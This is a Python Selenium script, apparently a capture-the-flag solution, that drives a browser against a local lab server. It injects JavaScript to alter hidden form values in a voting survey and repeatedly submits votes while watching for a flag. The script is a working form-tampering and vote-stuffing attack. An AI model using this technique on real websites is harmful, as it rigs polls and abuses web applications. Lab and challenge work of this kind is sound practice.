
#-*- coding: utf-8 -*-
from urllib.request import urlopen, Request
import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
#                                                                                                                   /!\
#IMPORTANT NE PAS OUBLIER DE RAJOUTER geckodriver pour firefox DANS UN REP DE $PATH SINON LE PROGRAMME NE S EXECUTERA PAS !
#                                                                                                                   /!\

class Survey:

    def __init__(self):
        self.select_decremente = ".getElementsByTagName('td')[0].getElementsByTagName('form')[0].getElementsByTagName('select')[0].options[0].selected = true"
        self.select_incremente = ".getElementsByTagName('td')[0].getElementsByTagName('form')[0].getElementsByTagName('select')[0].options[9].selected = true"
        self.actualize_index()

    def wait(self):
        time.sleep(0.08)
    
    def actualize_index(self):
        browser.execute_script("document.getElementsByTagName('caption')[0].getElementsByTagName('p')[0].innerHTML = 'bruteforcing in progress ... (" + str(Engine.index) + "/"+ str(Engine.max_index) + ")'")

    def decremente(self, target_index_sujet):
        try:
            self.actualize_index()
            if target_index_sujet > -1:
                browser.execute_script("document.getElementsByTagName('tbody')[0].getElementsByTagName('tr')[" + str(self.index_html) +"].getElementsByTagName('td')[0].getElementsByTagName('form')[0].getElementsByTagName('input')[0].setAttribute('value', " + str(target_index_sujet) + ")")
            browser.execute_script(self.req_select + self.select_decremente)
            browser.execute_script(self.req_select + ".getElementsByTagName('td')[0].getElementsByTagName('form')[0].submit()")
            self.wait()
        except:
            self.wait()
            self.decremente(target_index_sujet)

    def incremente(self, target_index_sujet=-1):
        try:
            self.actualize_index()
            if target_index_sujet > -1:
                browser.execute_script("document.getElementsByTagName('tbody')[0].getElementsByTagName('tr')[" + str(self.index_html) +"].getElementsByTagName('td')[0].getElementsByTagName('form')[0].getElementsByTagName('input')[0].setAttribute('value', " + str(target_index_sujet) + ")")
            browser.execute_script(self.req_select + self.select_incremente)
            browser.execute_script(self.req_select + ".getElementsByTagName('td')[0].getElementsByTagName('form')[0].submit()")
            self.wait()
        except:
            self.wait()
            self.incremente(target_index_sujet)


#class Subject(Survey):
#    def __init__(self, index_html):
#        Survey.__init__(self)
#        self.index_html = index_html
#        self.index_sujet = index_html + 1
#        self.req_select= "document.getElementsByTagName('tbody')[0].getElementsByTagName('tr')[" + str(index_html) +"]"



class Subject(Survey):
    def __init__(self, values):
        Survey.__init__(self)
        #print(values)
        self.average = values['average']
        self.index_html = int(values['sujet_value']) - 1
        self.index_sujet = int(values['sujet_value'])
        self.nb_votes = values['nb_votes']
        self.req_select= "document.getElementsByTagName('tbody')[0].getElementsByTagName('tr')[" + str(self.index_html) +"]"


class Engine:
    index = 0
    max_index = 0
    def __init__(self, max_i, page_source):

        self.browser = webdriver.Firefox()
        self.browser.get('http://192.168.0.17:8080/')
        Engine.max_index = max_i
        self.subject={}
        for key, value in self.get_average(page_source).items():
            self.subject[key]=Subject(value)
        #self.subject={'laurie':Subject(1), "mathieu":Subject(2), "thor":Subject(3), "ly":Subject(4), "zaz":Subject(5)}

    def check_flag(self, browser):
        sc = browser.page_source.lower()
        if sc.find("flag") > -1:
            print("FLAG IS HERE !")
            while 1 ==1:
                pass
        else:
            print("No FlaG !")


    def get_average(self, page_source):
        res = {}
        soup = BeautifulSoup(page_source, features="html.parser")
        for form in soup.find_all('tr', attrs={"bgcolor":"Silver"}):
            name = form.find_all("td")[2].string.lower()
            sujet_value = form.find("input").get('value')
            average = form.find_all("td")[1].string
            nb_votes = form.find_all("td")[3].string
            res[name.strip()]={"average":average.strip(), "sujet_value":sujet_value, "nb_votes":nb_votes.strip()}
        return res

    def brute_force(self):
        pass



browser = webdriver.Firefox()

browser.get('http://192.168.0.17:8080/')
#assert 'Yahoo' in browser.title

#print(browser.page_source)
#elem = browser.find_element_by_id('user_login')
#elem.text = "gmadec"
#browser.execute_script("document.getElementByClassName('button special big').setAttribute('value', 'gmadec')")

time.sleep(1)
browser.execute_script("document.getElementById('nav').getElementsByTagName('ul')[0].getElementsByTagName('li')[1].getElementsByTagName('a')[0].style.border='thick solid white'")
time.sleep(1)
browser.execute_script("document.getElementById('nav').getElementsByTagName('ul')[0].getElementsByTagName('li')[1].getElementsByTagName('a')[0].click()")
time.sleep(1)
i=0

#print(browser.page_source)
#def get_average(page_source):
#    res = {}
#    soup = BeautifulSoup(page_source, features="html.parser")
#    for form in soup.find_all('tr', attrs={"bgcolor":"Silver"}):
#        name = form.find_all("td")[2].string.lower()
#        sujet_value = form.find("input").get('value')
#        average = form.find_all("td")[1].string
#        nb_votes = form.find_all("td")[3].string
#        res[name.strip()]={"average":average.strip(), "sujet_value":sujet_value, "nb_votes":nb_votes.strip()}
#    return res
#print(get_average(browser.page_source))

engine = Engine(1222, browser.page_source)
    #if a.get('href') == "README":
    #    readme_url.append(url+"README")
    #    #print(url+"README")
    #    count_readme+=1
    #
    #elif a.get('href') != "../":
    #    parse_url(url+a.get('href'))

#time.sleep(22)

while Engine.index < Engine.max_index:
    #engine.subject['laurie'].decremente(-1)
    #    def decremente(self, target_index_sujet):

    engine.subject['laurie'].incremente(engine.subject['zaz'].index_sujet)
    try:
        engine.check_flag(browser)
    except:
        time.sleep(0.5)
        engine.check_flag(browser)
    engine.subject['mathieu'].incremente(engine.subject['zaz'].index_sujet)
    try:
        engine.check_flag(browser)
    except:
        time.sleep(0.5)
        engine.check_flag(browser)
    engine.subject['thor'].incremente(engine.subject['zaz'].index_sujet)
    try:
        engine.check_flag(browser)
    except:
        time.sleep(0.5)
        engine.check_flag(browser)
    engine.subject['ly'].incremente(engine.subject['zaz'].index_sujet)
    try:
        engine.check_flag(browser)
    except:
        time.sleep(0.5)
        engine.check_flag(browser)
    engine.subject['zaz'].incremente(engine.subject['zaz'].index_sujet)
    try:
        engine.check_flag(browser)
    except:
        time.sleep(0.5)
        engine.check_flag(browser)
    Engine.index +=1

#browser.execute_script("document.getElementById('banner').getElementsByTagName('ul')[0].getElementsByTagName('li')[0].getElementsByTagName('a')[0].text='Cliquez ici'")
#time.sleep(1)
#elem = browser.find_element_by_id('banner')  # Find the search box
##elem[0]
#browser.execute_script("document.getElementById('banner').getElementsByTagName('ul')[0].getElementsByTagName('li')[0].getElementsByTagName('a')[0].click()")
#
#time.sleep(1)
#browser.execute_script("document.getElementById('main').getElementsByTagName('div')[0].getElementsByTagName('tbody')[0].getElementsByTagName('tr')[4].getElementsByTagName('td')[0].getElementsByTagName('a')[0].style.border='thick solid black'")
#time.sleep(1)
#browser.execute_script("document.getElementById('main').getElementsByTagName('div')[0].getElementsByTagName('tbody')[0].getElementsByTagName('tr')[4].getElementsByTagName('td')[0].getElementsByTagName('a')[0].click()")
#time.sleep(1)
#browser.execute_script("document.getElementById('main').getElementsByTagName('div')[0].getElementsByTagName('table')[0].getElementsByTagName('tbody')[0].getElementsByTagName('tr')[1].getElementsByTagName('td')[1].getElementsByTagName('form')[0].getElementsByTagName('input')[0].setAttribute('type', 'text')")
#time.sleep(1)
#browser.execute_script("document.getElementById('main').getElementsByTagName('div')[0].getElementsByTagName('table')[0].getElementsByTagName('tbody')[0].getElementsByTagName('tr')[1].getElementsByTagName('td')[1].getElementsByTagName('form')[0].getElementsByTagName('input')[0].setAttribute('value', 'Fl4G')")
#time.sleep(1)
#browser.execute_script("document.getElementById('main').getElementsByTagName('div')[0].getElementsByTagName('table')[0].getElementsByTagName('tbody')[0].getElementsByTagName('tr')[1].getElementsByTagName('td')[1].getElementsByTagName('form')[0].getElementsByTagName('input')[1].style.border='thick solid green'")
#time.sleep(1)
#browser.execute_script("document.getElementById('main').getElementsByTagName('div')[0].getElementsByTagName('table')[0].getElementsByTagName('tbody')[0].getElementsByTagName('tr')[1].getElementsByTagName('td')[1].getElementsByTagName('form')[0].getElementsByTagName('input')[1].click()")

time.sleep(10)

browser.quit()